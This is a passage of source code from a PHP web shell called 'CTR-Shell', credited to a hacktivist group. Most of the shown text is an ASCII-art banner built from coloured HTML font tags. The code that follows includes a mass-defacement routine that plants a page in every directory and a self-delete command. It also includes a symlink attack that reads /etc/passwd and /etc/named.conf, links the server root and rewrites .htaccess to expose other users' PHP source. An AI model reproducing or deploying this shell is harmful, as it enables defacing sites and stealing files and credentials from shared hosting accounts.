color=#84725f>0</font><font color=#8b7864>0</font><font color=#8b7763>0</font><font color=#8d7963>0</font><font color=#8d7862>1</font><font color=#8b745d>0</font><font color=#867059>0</font><font color=#816951>1</font><font color=#7f6148>1</font><font color=#7d5739>0</font><font color=#774c2f>0</font><font color=#724224>1</font><font color=#6b3b1c>0</font><font color=#69391a>1</font><font color=#623619>1</font><font color=#56361f>0</font><font color=#4d331b>0</font><font color=#34271b>0</font><font color=#1a1915>0</font><font color=#0b0a06>1</font><font color=#040301>1</font><font color=#050400>0</font><font color=#0d0705>1</font><font color=#2b1d15>0</font><font color=#6a5646>0</font><font color=#b6a48c>0</font><font color=#e8dab0>0</font><font color=#e4cd9a>1</font><font color=#ad875a>1</font><font color=#7b5331>1</font><font color=#a4876b>1</font><font color=#e9dcc4>0</font><font color=#f9f5e3>1</font><font color=#e0d3bf>1</font><font color=#846a56>0</font><font color=#1b0e09>0</font><font color=#080101>0</font><font color=#030101>1</font><font color=#020109>1</font><font color=#00010b>1</font><font color=#01010a>0</font><font color=#020202>1</font><font color=#0d0603>0</font><font color=#1c120a>0</font><font color=#0c1c21>1</font><font color=#0b191c>1</font><br><font color=#030607>0</font><font color=#1d434f>0</font><font color=#0b181d>1</font><font color=black>011010</font><font color=#020000>1</font><font color=#140903>1</font><font color=#aa906e>0</font><font color=#fef9d8>1</font><font color=#e5ddc5>1</font><font color=#473d31>0</font><font color=#0b0101>1</font><font color=#0c0002>0</font><font color=#03020d>0</font><font color=#0e0109>1</font><font color=#30160c>1</font><font color=#96826d>0</font><font color=#ebe4d7>0</font><font color=#fcfcf7>1</font><font color=#fbfdfa>1</font><font color=#fafefb>1</font><font color=#fbfcfa>0</font><font color=#fdfdfb>0</font><font color=#f8f3e4>0</font><font color=#d0bfac>1</font><font color=#806e63>0</font><font color=#382923>0</font><font color=#140906>0</font><font color=#090101>0</font><font color=#080204>1</font><font color=#080106>0</font><font color=#080208>0</font><font color=#020107>1</font><font color=#010005>0</font><font color=#020002>1</font><font color=#050101>0</font><font color=#0b0402>1</font><font color=#211711>0</font><font color=#4a3e31>0</font><font color=#786b59>0</font><font color=#a3977e>0</font><font color=#c8bcb0>1</font><font color=#e0d6c9>0</font><font color=#f0e9d8>1</font><font color=#f8f2e0>1</font><font color=#fbf5de>1</font><font color=#f9f2d8>1</font><font color=#efe9cc>1</font><font color=#ded6b8>0</font><font color=#ccc3a4>1</font><font color=#bcab8f>1</font><font color=#aa977d>1</font><font color=#97836a>0</font><font color=#87705a>1</font><font color=#77614b>0</font><font color=#6b5441>0</font><font color=#5d4837>1</font><font color=#544032>1</font><font color=#4e392c>1</font><font color=#473224>0</font><font color=#3f2c1f>0</font><font color=#3b291b>0</font><font color=#362517>0</font><font color=#342416>0</font><font color=#352619>1</font><font color=#332418>0</font><font color=#302217>0</font><font color=#261b13>0</font><font color=#1b130f>0</font><font color=#110a07>1</font><font color=#050201>1</font><font color=#030102>1</font><font color=#020103>0</font><font color=#030103>1</font><font color=#050102>1</font><font color=#090404>1</font><font color=#2c2217>0</font><font color=#7d6952>1</font><font color=#ceb796>0</font><font color=#e7c9a3>1</font><font color=#a47556>1</font><font color=#683b27>0</font><font color=#b19684>0</font><font color=#f6eddd>0</font><font color=#fbf6eb>1</font><font color=#ae977e>1</font><font color=#2d190e>1</font><font color=#0b0100>1</font><font color=#030205>1</font><font color=#010109>1</font><font color=#020108>0</font><font color=#080101>0</font><font color=#1d0f0b>0</font><font color=#5c4128>1</font><font color=#13272d>1</font><font color=#020607>1</font><br><font color=black>1</font><font color=#0f2228>1</font><font color=#183b45>1</font><font color=#010304>1</font><font color=black>00001</font><font color=#010101>0</font><font color=#030201>1</font><font color=#5a4435>1</font><font color=#ebd8b7>0</font><font color=#e1c19b>1</font><font color=#3c200f>0</font><font color=#030006>0</font><font color=#03030e>1</font><font color=#03020b>1</font><font color=#250e07>0</font><font color=#aa886a>0</font><font color=#f9f3e1>0</font><font color=#fefcf8>0</font><font color=#fafefe>1</font><font color=#f9fdfd>1</font><font color=#fcfcf7>1</font><font color=#fcf9eb>1</font><font color=#ddcbb3>0</font><font color=#6b5d55>0</font><font color=#1b1310>1</font><font color=#080101>1</font><font color=#070202>1</font><font color=#030001>0</font><font color=#010000>1</font><font color=#000102>1</font><font color=#000103>1</font><font color=#010104>1</font><font color=#01040e>0</font><font color=#030206>1</font><font color=#180705>1</font><font color=#5a3b29>1</font><font color=#a98e72>1</font><font color=#d9cebb>1</font><font color=#f4f0e7>1</font><font color=#fafaf3>1</font><font color=#fcfdf5>1</font><font color=#fefaf9>1</font><font color=#f8f0eb>0</font><font color=#decfc1>1</font><font color=#b49c88>0</font><font color=#856c59>0</font><font color=#5a4638>0</font><font color=#362c23>1</font><font color=#1c1912>1</font><font color=#110e08>0</font><font color=#090504>0</font><font color=#050201>0</font><font color=#030100>0</font><font color=#030000>0</font><font color=#020000>10</font><font color=#030000>0</font><font color=#020000>011</font><font color=#010000>11</font><font color=black>100</font><font color=#010000>10</font><font color=#020000>0</font><font color=#030000>0</font><font color=#020000>0</font><font color=#010000>0</font><font color=#010001>0</font><font color=#010002>0</font><font color=#000001>01</font><font color=#010002>0</font><font color=#040104>1</font><font color=#0a0107>1</font><font color=#1a0f0a>1</font><font color=#554132>1</font><font color=#b1986d>0</font><font color=#ce9f65>1</font><font color=#6a3b1e>1</font><font color=#906e56>0</font><font color=#f1e8da>0</font><font color=#faf2df>0</font><font color=#a1836a>0</font><font color=#1d0a05>0</font><font color=#050105>0</font><font color=#000215>0</font><font color=#030114>0</font><font color=#100103>0</font><font color=#3e210d>1</font><font color=#6a5c35>1</font><font color=#0b1517>1</font><font color=black>0</font><br><font color=black>1</font><font color=#020404>1</font><font color=#1a3d48>0</font><font color=#0d2026>0</font><font color=#000101>1</font><font color=black>0010</font><font color=#010101>1</font><font color=#030201>0</font><font color=#110905>1</font><font color=#8f7154>1</font><font color=#e9c395>0</font><font color=#4c2b15>0</font><font color=#010101>0</font><font color=#010304>0</font><font color=#030202>1</font><font color=#5c4029>1</font><font color=#f1daba>0</font><font color=#fefdf0>1</font><font color=#fbfdfb>1</font><font color=#f8fefe>1</font><font color=#fdfdf7>1</font><font color=#fdfaed>0</font><font color=#c1b19f>1</font><font color=#3f2b20>0</font><font color=#090202>0</font><font color=#040102>1</font><font color=#030001>0</font><font color=#030102>1</font><font color=#020202>0</font><font color=black>11</font><font color=#000101>1</font><font color=#010101>1</font><font color=#090303>0</font><font color=#32241b>0</font><font color=#a69483>1</font><font color=#f3ecdc>1</font><font color=#fdfbee>1</font><font color=#fdfbf3>1</font><font color=#fdfcf6>1</font><font color=#fdf9ee>1</font><font color=#eae0d0>1</font><font color=#a29284>0</font><font color=#4d4037>1</font><font color=#1d1310>1</font><font color=#0c0504>0</font><font color=#080204>0</font><font color=#060204>1</font><font color=#040102>0</font><font color=#030101>1</font><font color=#050101>0</font><font color=black>10001100101100101101111111</font><font color=#050002>1</font><font color=#080104>1</font><font color=#040103>1</font><font color=#050302>1</font><font color=#110903>1</font><font color=#47301b>1</font><font color=#8f6840>0</font><font color=#61341c>1</font><font color=#aa7c5a>0</font><font color=#fdf7e8>1</font><font color=#e7d7c2>0</font><font color=#493527>1</font><font color=#040103>1</font><font color=#020209>0</font><font color=#060107>1</font><font color=#210904>1</font><font color=#7a5835>0</font><font color=#272920>1</font><font color=#010101>0</font><font color=black>0</font><br><font color=black>11</font><font color=#050d10>0</font><font color=#1c444f>1</font><font color=#081418>1</font><font color=#000001>00</font><font color=black>10</font><font color=#010000>1</font><font color=#030101>00</font><font color=#1e0f08>0</font><font color=#a17651>1</font><font color=#855d3b>0</font><font color=#110503>0</font><font color=#040401>1</font><font color=#040502>0</font><font color=#755b3d>1</font><font color=#faebca>0</font><font color=#fdfdf3>0</font><font color=#f6feff>0</font><font color=#f8fefd>0</font><font color=#fefdf0>1</font><font color=#e2d0b9>1</font><font color=#493324>0</font><font color=#090101>0</font><font color=#030101>0</font><font color=#010000>0</font><font color=black>01</font><font color=#010000>1</font><font color=#010101>10</font><font color=#000101>1</font><font color=#000100>0</font><font color=#38190c>0</font><font color=#c2a78c>0</font><font color=#fcf9ef>1</font><font color=#fafdfb>1</font><font color=#f9fefe>1</font><font color=#fcfdf9>1</font><font color=#fbf8ec>1</font><font color=#c4b29d>0</font><font color=#4a3223>1</font><font color=#0d0402>1</font><font color=#070101>0</font><font color=#010101>0</font><font color=#010206>0</font><font color=#00020c>11</font><font color=#010007>0</font><font color=#040002>1</font><font color=#060101>1</font><font color=#010000>1</font><font color=black>0100111011110111001100110</font><font color=#020000>0</font><font color=#030001>1</font><font color=#010102>0</font><font color=#010103>1</font><font color=#010303>1</font><font color=#040204>0</font><font color=#120704>1</font><font color=#3b190b>0</font><font color=#682911>0</font><font color=#f2e4cf>0</font><font color=#f6f1e4>0</font><font color=#735844>0</font><font color=#0d0101>1</font><font color=#0f0201>0</font><font color=#29160d>0</font><font color=#947353>1</font><font color=#4a4134>0</font><font color=#010101>0</font><font color=black>01</font><br><font color=black>001</font><font color=#0a191d>0</font><font color=#1b424c>0</font><font color=#060f11>1</font><font color=black>101</font><font color=#020000>1</font><font color=#040105>0</font><font color=#01010c>1</font><font color=#060102>0</font><font color=#290d07>1</font><font color=#835736>1</font><font color=#462d1c>0</font><font color=#050301>1</font><font color=#020201>1</font><font color=#4f351d>1</font><font color=#edcfad>1</font><font color=#fafdf8>1</font><font color=#f3fefe>1</font><font color=#fafefc>1</font><font color=#fdf7e5>1</font><font color=#b18d6d>1</font><font color=#1a0904>1</font><font color=#030101>1</font><font color=#010100>1</font><font color=black>010</font><font color=#010101>0</font><font color=#010201>0</font><font color=#010101>1</font><font color=#000101>1</font><font color=#010101>1</font><font color=#765031>0</font><font color=#f5e5cb>0</font><font color=#fefdf6>1</font><font color=#fbfdff>1</font><font color=#fbfdfa>0</font><font color=#fefdf0>1</font><font color=#d7c7b3>1</font><font color=#443124>0</font><font color=#0f0101>1</font><font color=#030102>0</font><font color=#010101>1</font><font color=#010001>0</font><font color=#020101>0</font><font color=#020003>0</font><font color=#020002>0</font><font color=#010002>0</font><font color=#000001>0</font><font color=#010102>0</font><font color=black>00110111110101100011010101</font><font color=#000204>1</font><font color=#010204>1</font><font color=#020000>1</font><font color=#040101>1</font><font color=#020104>1</font><font color=#01020a>0</font><font color=#040205>1</font><font color=#0e0101>1</font><font color=#502515>0</font><font color=#e7ddc1>0</font><font color=#faf5e0>1</font><font color=#8e6a50>0</font><font color=#32170f>0</font><font color=#755c49>1</font><font color=#c6b48f>1</font><font color=#67624f>0</font><font color=#040504>0</font><font color=black>001</font><br><font color=black>011</font><font color=#000101>1</font><font color=#0c1b20>1</font><font color=#1c424d>0</font><font color=#071013>1</font><font color=#010101>1</font><font color=black>0</font><font color=#010001>1</font><font color=#010105>11</font><font color=#030001>0</font><font color=#080001>1</font><font color=#110906>1</font><font color=#433c31>0</font><font color=#23201a>1</font><font color=#050201>1</font><font color=#130602>1</font><font color=#88684e>0</font><font color=#f3e8d2>0</font><font color=#fcf9ef>0</font><font color=#fefcfa>0</font><font color=#f8f2e9>1</font><font color=#85664d>0</font><font color=#0f0300>0</font><font color=#020404>1</font><font color=#000101>1</font><font color=black>010010</font><font color=#000001>1</font><font color=#010001>1</font><font color=#724023>0</font><font color=#f4dfc5>1</font><font color=#fafefa>0</font><font color=#f7feff>0</font><font color=#fcfdf8>0</font><font color=#fefae4>1</font><font color=#ba9e81>0</font><font color=#22130a>0</font><font color=#030200>1</font><font color=#020003>1</font><font color=#020002>1</font><font color=#010002>1</font><font color=#020102>0</font><font color=#020103>1</font><font color=#010002>1</font><font color=#010102>1</font><font color=#000002>1</font><font color=#000001>0</font><font color=black>11111111001101011110001000</font><font color=#030101>00</font><font color=#010103>0</font><font color=#020209>0</font><font color=#010209>1</font><font color=#010206>1</font><font color=#060102>1</font><font color=#110201>0</font><font color=#7e553b>0</font><font color=#f8f0e5>0</font><font color=#f8f3ef>1</font><font color=#c9b6a4>0</font><font color=#e0d1b3>1</font><font color=#dccca8>1</font><font color=#595444>1</font><font color=#030303>1</font><font color=black>0001</font><br><font color=black>1010</font><font color=#000001>0</font><font color=#081317>0</font><font color=#1a3d48>0</font><font color=#0c1c21>1</font><font color=#010203>1</font><font color=#010001>0</font><font color=#010103>0</font><font color=#010101>1</font><font color=#010000>1</font><font color=#010001>1</font><font color=#050201>0</font><font color=#050302>0</font><font color=#1e1a15>1</font><font color=#100c09>0</font><font color=#0a0001>1</font><font color=#1c0a05>0</font><font color=#856e5b>0</font><font color=#ebe3d5>0</font><font color=#fefbf4>1</font><font color=#f9f3e3>1</font><font color=#8f6d50>0</font><font color=#130401>0</font><font color=#020505>1</font><font color=#000101>0</font><font color=black>011000</font><font color=#000001>00</font><font color=#2c0f08>1</font><font color=#b09680>1</font><font color=#faf8f2>0</font><font color=#fcfcfa>0</font><font color=#fdfcf6>1</font><font color=#fefcea>1</font><font color=#d5c1a9>1</font><font color=#392a1f>0</font><font color=#080200>0</font><font color=#050101>1</font><font color=#030001>1</font><font color=#010101>0</font><font color=black>1011</font><font color=#000101>1</font><font color=black>111010110000111110110010100</font><font color=#010001>0</font><font color=#010000>1</font><font color=#010103>1</font><font color=#010105>1</font><font color=#000104>0</font><font color=#030101>1</font><font color=#0e0101>0</font><font color=#503120>0</font><font color=#ddbf9b>0</font><font color=#f9f1e0>1</font><font color=#e7dacd>0</font><font color=#b9ab9c>0</font><font color=#706859>0</font><font color=#29322f>1</font><font color=#020404>0</font><font color=black>00111</font><br><font color=black>011111</font><font color=#04080a>0</font><font color=#133037>0</font><font color=#122b32>1</font><font color=#030607>1</font><font color=#010101>1</font><font color=black>001</font><font color=#010100>1</font><font color=#020100>1</font><font color=#030101>1</font><font color=#040101>0</font><font color=#030002>0</font><font color=#090102>1</font><font color=#170a07>0</font><font color=#68594d>0</font><font color=#dfd7c8>1</font><font color=#fdf7df>0</font><font color=#bb946e>0</font><font color=#210a05>1</font><font color=#030305>0</font><font color=#000102>1</font><font color=black>0110001</font><font color=#000001>0</font><font color=#090101>1</font><font color=#31231c>0</font><font color=#b4a292>0</font><font color=#fcf6e6>1</font><font color=#fffcef>0</font><font color=#fefbf0>1</font><font color=#f8f3e8>1</font><font color=#9b8875>1</font><font color=#240f09>1</font><font color=#040101>0</font><font color=#050100>1</font><font color=#010101>10</font><font color=black>001</font><font color=#000101>11</font><font color=black>0111100100111111100000000100</font><font color=#000001>1</font><font color=#010101>10</font><font color=#070302>1</font><font color=#3a2c24>0</font><font color=#8d715a>0</font><font color=#957962>1</font><font color=#62473a>1</font><font color=#362019>0</font><font color=#1a1a1b>1</font><font color=#0f2025>1</font><font color=#030608>1</font><font color=#000001>1</font><font color=black>01010</font><br><font color=black>0000010</font><font color=#010202>0</font><font color=#0b1a1e>1</font><font color=#16353d>1</font><font color=#091619>1</font><font color=#010202>1</font><font color=black>110</font><font color=#000001>0</font><font color=#010003>1</font><font color=#020103>1</font><font color=#01010a>1</font><font color=#02010a>0</font><font color=#0a0100>1</font><font color=#0f0503>1</font><font color=#473829>0</font><font color=#c6b08e>0</font><font color=#e8ca9d>1</font><font color=#52321c>0</font><font color=#050203>1</font><font color=#010102>0</font><font color=black>111010</font><font color=#000001>11</font><font color=#01030a>0</font><font color=#090204>0</font><font color=#2c110b>0</font><font color=#8d6d56>0</font><font color=#dfd2c1>0</font><font color=#f9f9f6>0</font><font color=#fdfdfa>1</font><font color=#f4ead7>1</font><font color=#9f7a56>0</font><font color=#171210>0</font><font color=#040101>1</font><font color=#020101>01</font><font color=#010000>0</font><font color=#010101>0</font><font color=#000001>1</font><font color=#000101>0</font><font color=black>001101010000000110001100101110</font><font color=#010101>10</font><font color=#050303>0</font><font color=#100c0a>0</font><font color=#0e0705>1</font><font color=#0e0202>1</font><font color=#090708>1</font><font color=#122025>0</font><font color=#0b171b>0</font><font color=#010203>1</font><font color=black>1111001</font><br><font color=black>0100000</font><font color=#000001>1</font><font color=#010001>1</font><font color=#020606>1</font><font color=#10272d>1</font><font color=#132d34>1</font><font color=#071114>1</font><font color=#010202>1</font><font color=black>10</font><font color=#000001>00</font><font color=#000003>1</font><font color=#010104>1</font><font color=#030000>0</font><font color=#060101>1</font><font color=#0a0100>1</font><font color=#24120a>0</font><font color=#866751>0</font><font color=#997256>1</font><font color=#32110a>1</font><font color=#0a0101>1</font><font color=#000100>01</font><font color=black>1101</font><font color=#000001>00</font><font color=#010207>1</font><font color=#040003>0</font><font color=#0a0101>1</font><font color=#0c0101>0</font><font color=#241812>1</font><font color=#685c50>1</font><font color=#b5a897>0</font><font color=#e0d7be>0</font><font color=#f0e8cc>0</font><font color=#b7997c>1</font><font color=#472b1c>0</font><font color=#100403>1</font><font color=#070101>1</font><font color=#010101>1</font><font color=#010204>0</font><font color=#000103>1</font><font color=#000101>0</font><font color=black>11011000000001111011100100011101</font><font color=#010202>0</font><font color=#010101>1</font><font color=#040607>0</font><font color=#0b181c>0</font><font color=#0e1f25>0</font><font color=#030709>1</font><font color=black>110111110</font><br><font color=black>0100001010</font><font color=#000001>0</font><font color=#050b0e>1</font><font color=#112930>0</font><font color=#122c33>0</font><font color=#070f12>1</font><font color=#000201>0</font><font color=#000001>0</font><font color=black>1</font><font color=#000001>1</font><font color=#010101>1</font><font color=#000101>0</font><font color=#010101>1</font><font color=#030100>0</font><font color=#080101>0</font><font color=#100403>1</font><font color=#443021>0</font><font color=#63452f>1</font><font color=#110a08>1</font><font color=#010101>11</font><font color=#000100>1</font><font color=black>0111</font><font color=#000001>0</font><font color=#010103>1</font><font color=#000102>0</font><font color=#010101>1</font><font color=#030001>0</font><font color=#050101>1</font><font color=#080201>0</font><font color=#0f0604>0</font><font color=#261b15>0</font><font color=#463c34>1</font><font color=#7c604a>0</font><font color=#83654c>0</font><font color=#574236>0</font><font color=#170f0c>0</font><font color=#030101>0</font><font color=#010001>0</font><font color=#000001>0</font><font color=#030000>00</font><font color=black>1011000011010101111100010100111</font><font color=#030506>0</font><font color=#0b191d>0</font><font color=#0d1f24>1</font><font color=#050d0e>1</font><font color=#000001>00</font><font color=black>001110000</font><br><font color=black>10011110101</font><font color=#000001>0</font><font color=#000101>0</font><font color=#050b0d>1</font><font color=#0f242a>1</font><font color=#122c34>1</font><font color=#081518>1</font><font color=#010204>0</font><font color=#000101>0</font><font color=#010101>0</font><font color=#000201>1</font><font color=#010201>00</font><font color=#020301>0</font><font color=#030201>1</font><font color=#070101>0</font><font color=#160c07>0</font><font color=#130f0d>0</font><font color=#020101>1</font><font color=#010101>0</font><font color=#020102>1</font><font color=#010101>0</font><font color=black>0000</font><font color=#000201>00</font><font color=#000101>0</font><font color=#000102>0</font><font color=#010102>010</font><font color=#020101>00</font><font color=#0b0101>0</font><font color=#0a0302>1</font><font color=#0c0606>0</font><font color=#060505>1</font><font color=#010103>1</font><font color=#010004>01</font><font color=#010003>0</font><font color=#000003>1</font><font color=black>0101011011011001001110000000</font><font color=#010001>0</font><font color=#04080a>0</font><font color=#0c1c21>01</font><font color=#040a0c>1</font><font color=#000102>1</font><font color=black>101000010111</font><br><font color=black>000000110110101</font><font color=#010202>0</font><font color=#091519>0</font><font color=#11282f>0</font><font color=#0f2126>0</font><font color=#090f12>0</font><font color=#030404>1</font><font color=#000104>1</font><font color=#010006>1</font><font color=#010105>1</font><font color=#010205>1</font><font color=#020203>0</font><font color=#020001>0</font><font color=#020101>0</font><font color=#010101>0100</font><font color=black>1001</font><font color=#010103>1</font><font color=#010004>0</font><font color=#010003>0</font><font color=#000001>0</font><font color=black>0</font><font color=#000001>0</font><font color=#000101>001</font><font color=#010004>1</font><font color=#010005>1</font><font color=#010004>0</font><font color=#010003>1</font><font color=#010002>0</font><font color=#020002>1</font><font color=#010002>011</font><font color=black>01111010111000110000111</font><font color=#000100>0</font><font color=#000101>1</font><font color=#010102>1</font><font color=#030809>1</font><font color=#081316>0</font><font color=#0c1e22>1</font><font color=#091418>1</font><font color=#020304>1</font><font color=black>010001001111010</font><br><font color=black>10100000011000011</font><font color=#000102>1</font><font color=#04090c>0</font><font color=#0b191e>0</font><font color=#0f2329>0</font><font color=#0d1e25>0</font><font color=#081218>1</font><font color=#030408>1</font><font color=#000103>0</font><font color=#010002>0</font><font color=#000001>0</font><font color=black>101</font><font color=#010101>0</font><font color=black>00001</font><font color=#000002>0</font><font color=#010002>0</font><font color=#010001>1</font><font color=black>000110</font><font color=#000002>0</font><font color=#000001>1</font><font color=black>0</font><font color=#010000>0010</font><font color=#020000>0</font><font color=#010000>0</font><font color=black>0101111101111111010010</font><font color=#010202>1</font><font color=#04090a>0</font><font color=#081317>1</font><font color=#0b191d>1</font><font color=#09161a>1</font><font color=#040a0c>0</font><font color=#010102>1</font><font color=#000001>1</font><font color=black>0000000011011110</font><br><font color=black>11101000000111000001</font><font color=#010102>0</font><font color=#030709>1</font><font color=#091418>0</font><font color=#0d2126>0</font><font color=#0e2429>1</font><font color=#0b1b1f>1</font><font color=#040a0c>1</font><font color=#010202>1</font><font color=black>0111010110100111000010000000000110010000010</font><font color=#000001>1</font><font color=#000101>1</font><font color=#020406>1</font><font color=#071012>0</font><font color=#0a191c>0</font><font color=#0b181c>1</font><font color=#081115>0</font><font color=#030709>0</font><font color=#010202>1</font><font color=#000001>0</font><font color=black>0000010011001111110</font><br><font color=black>100110000001000110010101</font><font color=#010101>1</font><font color=#050b0d>0</font><font color=#0b1a1e>0</font><font color=#0e2227>1</font><font color=#0e2026>1</font><font color=#0b191e>0</font><font color=#071114>0</font><font color=#040a0c>0</font><font color=#030506>1</font><font color=#010202>1</font><font color=#000001>1</font><font color=black>0100100100011011110000010000001</font><font color=#000101>0</font><font color=#020304>1</font><font color=#030608>1</font><font color=#050b0d>0</font><font color=#081115>0</font><font color=#0a171a>1</font><font color=#0a191d>0</font><font color=#081418>0</font><font color=#04090a>1</font><font color=#000101>0</font><font color=black>101110110000011011011000</font><br><font color=black>1000011011010111010011011000</font><font color=#010101>1</font><font color=#030608>1</font><font color=#061012>1</font><font color=#091619>0</font><font color=#0a181d>1</font><font color=#0c1b20>0</font><font color=#0b1b20>0</font><font color=#0a181c>0</font><font color=#081417>1</font><font color=#071012>1</font><font color=#050c0d>0</font><font color=#030608>0</font><font color=#010305>1</font><font color=#010203>1</font><font color=#000101>0</font><font color=#010100>0</font><font color=black>101010001010</font><font color=#000100>0</font><font color=#000101>0</font><font color=#010102>1</font><font color=#010303>0</font><font color=#020406>0</font><font color=#04080a>1</font><font color=#050c0d>0</font><font color=#070f12>0</font><font color=#071114>0</font><font color=#081417>0</font><font color=#091619>1</font><font color=#091518>0</font><font color=#071214>1</font><font color=#050d10>1</font><font color=#030608>1</font><font color=#010101>0</font><font color=black>0000110000000100110110101101</font><br><font color=black>000001000110111100110010010100100</font><font color=#000101>0</font><font color=#010303>0</font><font color=#020506>0</font><font color=#04080a>0</font><font color=#050c0e>1</font><font color=#071013>0</font><font color=#09161a>0</font><font color=#0a181d>0</font><font color=#0b1b20>0</font><font color=#0b1d21>1</font><font color=#0b1a1f>0</font><font color=#0a181c>11</font><font color=#091519>1</font><font color=#081215>0</font><font color=#071013>1</font><font color=#061013>0</font><font color=#061012>10</font><font color=#061113>1</font><font color=#081215>0</font><font color=#091417>1</font><font color=#091316>1</font><font color=#09161a>10</font><font color=#09171a>1</font><font color=#081316>0</font><font color=#081114>1</font><font color=#060d0f>0</font><font color=#04090b>1</font><font color=#030608>0</font><font color=#020405>1</font><font color=#010203>1</font><font color=#000101>1</font><font color=black>111</font><font color=#000001>1</font><font color=black>00111101100100011110111011100</font><br>
</pre></font>
<!-- IMAGE ENDS HERE -->

</pre></font>
    CyberTeamRox is International Cyber Hacktivist group.We Fight for Civil Liberty.<br>CTR-Shell is a php shell coded by Witch3r.Witch3r Won't be responsible for any misuse done by this script.
      <br><br>
     <a href=http://cyberteamrox.org>Website</a><br>
     <A href=https://www.facebook.com/TeamRoxofficial>Like us</a><br>
     <a href=http://twitter.com/CyberTeamRox>Follow us</a><br>
    <?php
    
}
else if(isset($_GET['MassDeface']))
{
if (isset($_POST['file']) &&
        isset($_POST['path']) 
     )
    {
        $path = $_POST['path'];
            
        if($path[(strlen($path)-1)] != $SEPARATOR){$path = $path.$SEPARATOR;}
        
        if(is_dir($path))
        {
            $uploadedFilePath = $_FILES['file']['name'];
            $tempName = $_FILES['file']['tmp_name'];
            $uploadPath = $path .  $uploadedFilePath;
            $stat = move_uploaded_file($tempName , $uploadedFilePath);
            if ($stat)
            {
                echo "<p class='warning'>File uploaded to $uploadPath</p>";
            }
            else
            {
                echo "<p class='warning' > :( :'( Failed to upload file to $uploadPath</p>";
            }
         }
    }
    else
    {
    ?>
    <table class="bind" align="center" >
    <tr>
   
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <form method="POST" enctype="multipart/form-data">
                
                <tr><center></font><font color=red>Deface Page:</center></font>
                    <td width="100"><input type="file" name="file"/></td>
              
            
                </tr>
                
                 <tr>
                    <td colspan="2">
     
                    </td>
                </tr>
                
                </form>
            </table>
         </td>
    </tr>
    </table>

<?php
}

echo "<center><textarea class='cmd' rows='10' cols='100' disabled='true'>";
$defaceurl ='http://'.$_SERVER['HTTP_HOST'].$uploadPath;

$dir = $_POST['massdefacedir'];
$defacename= $_POST['namedeface'];

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file.'/'.$defacename;
                                echo $newfile."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "failed to copy $file...\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
<br>Directory to inject defaces: <input class='cmd' type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
<br><br>
Deface page name:<input class='cmd' type='text' style='width: 100px'  name='namedeface' value='fuCk.php'><br><br>
<input class='own' type='submit' name='execmassdeface' value='Deface'></form></td>
<br>
<br>
</body></html>
<?php
}
 else if(isset($_GET['selfkill']))
                    {
                    unlink(__FILE__);
                    echo "<br><center><font class=txt size=5>CTR Shell will be no longer available in this server.</font></center>";
                    }
else if(isset($_REQUEST["symlinkserver"]))
                    {
                    ?>
              
                    <?php
                   
                   
                   if(ctr==ctr)
                    {
                    $d0mains = @file("/etc/named.conf");
                     
                    if($d0mains)
                    {
                    @mkdir("ctr",0777);
                    @chdir("ctr");
                    execmd("ln -s / root");
                    $file3 = 'Options all
                    DirectoryIndex Sux.html
                    AddType text/plain .php
                    AddHandler server-parsed .php
                    AddType text/plain .html
                    AddHandler txt .html
                    Require None
                    Satisfy Any
                    ';
                    $fp3 = fopen('.htaccess','w');
                    $fw3 = fwrite($fp3,$file3);
                    @fclose($fp3);
               
                    $dcount = 1;
                    foreach($d0mains as $d0main)
                    {
                    if(eregi("zone",$d0main))
                    {
                    preg_match_all('#zone "(.*)"#', $d0main, $domains);
                    flush();
                     
                    if(strlen(trim($domains[1][0])) > 2)
                    {
                    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
                     
                    echo "<tr align=center><td><font size=3>" . $dcount . "</font></td><td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td><td>".$user['name']."</td><td><a href='/ctr/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td><td><a href=?whois=".$domains[1][0]." target=_blank>info</a></td></tr>"; flush();
                
                    }
                    }
                    }
                    echo "</table>";
                    }
                    else
                    {
                    $TEST=@file('/etc/passwd');
                    if ($TEST)
                    {
                    @mkdir("ctr",0777);
                    @chdir("ctr");
                    execmd("ln -s / root");
                    $file3 = 'Options all
                    DirectoryIndex Sux.html
                    AddType text/plain .php
                    AddHandler server-parsed .php
                    AddType text/plain .html
                    AddHandler txt .html
                    Require None
                    Satisfy Any
                    ';
                    $fp3 = fopen('.htaccess','w');
                    $fw3 = fwrite($fp3,$file3);
                    @fclose($fp3);
                     
                    echo "<table align=center border=0 ><tr><td align=center><font size=4></font></td><td align=center><font size=4></font></td></tr>";
                     
                   
                    $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
                    //Output a line of the file until the end is reached
                    while(!feof($file))
                    {
                    $s = fgets($file);
                    $matches = array();
                    $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                    $matches = str_replace("home/","",$matches[1]);
                    if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                    continue;
                    echo "<tr><td align=center><font class=txt>" . $matches . "</td>";
                    echo "<td align=center><font class=txt></font><font color=red>>></font><a href=/ctr/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
              
                    }
                    fclose($file);
                     
                    echo "</table>";
                    }
                    else
                    {
                    if($os != "Windows")
                    {
                    @mkdir("ctr",0777);
                    @chdir("ctr");
                    execmd("ln -s / root");
                    $file3 = 'Options all
                    DirectoryIndex Sux.html
                    AddType text/plain .php
                    AddHandler server-parsed .php
                    AddType text/plain .html
                    AddHandler txt .html
                    Require None
                    Satisfy Any
                    ';
                    $fp3 = fopen('.htaccess','w');
                    $fw3 = fwrite($fp3,$file3);
                    @fclose($fp3);
                     
                   
                     
                    $temp = "";
                    $val1 = 0;
                    $val2 = 1000;
                    for(;$val1 <= $val2;$val1++)
                    {
                    $uid = @posix_getpwuid($val1);
